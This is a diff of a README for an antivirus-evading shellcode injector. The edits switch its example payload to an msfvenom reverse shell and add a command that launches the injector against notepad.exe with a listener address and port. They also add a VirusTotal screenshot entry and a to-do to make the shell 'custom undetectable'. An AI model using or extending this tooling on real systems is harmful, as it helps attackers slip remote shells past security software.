@@ -4,7 +4,7 @@ Simple undetectable shellcode and code injector launcher example. Inspired by RT
 
 ## Main logic
 
-XOR encryption and decryption for functions call and main payload - `calc.exe` as example.
+XOR encryption and decryption for functions call and main payload - `msfvenom` reverse shell as example.
 
 ## Usage
 ## 1. DLL
@@ -49,7 +49,7 @@ ip a
 
 ![check IP](./screenshots/6.png?raw=true)
 
-run python script on linux (for example process notepad.exe):
+run python script on linux (for example process `notepad.exe`):
 ```bash
 python3 peekaboo-inj.py -l 10.9.1.6 -p 4444 -e notepad.exe
 ```
@@ -84,8 +84,14 @@ Tested on:
 3. Payload: windows x64 reverse shell from msfvenom
 4. AV Engines: Kaspersky, Windows Defender, Norton Commander
 
+# Virus Total result:
+02 september 2021
+
+![virustotal](./screenshots/11.png?raw=true)
+
 ## TODO
 Compile injector in Kali linux
+Replace msfvenom shell to custom undetectable
 
 ## Attention
 This tool is a Proof of Concept and is for Educational Purposes Only!!! Author takes no responsibility of any damage you cause
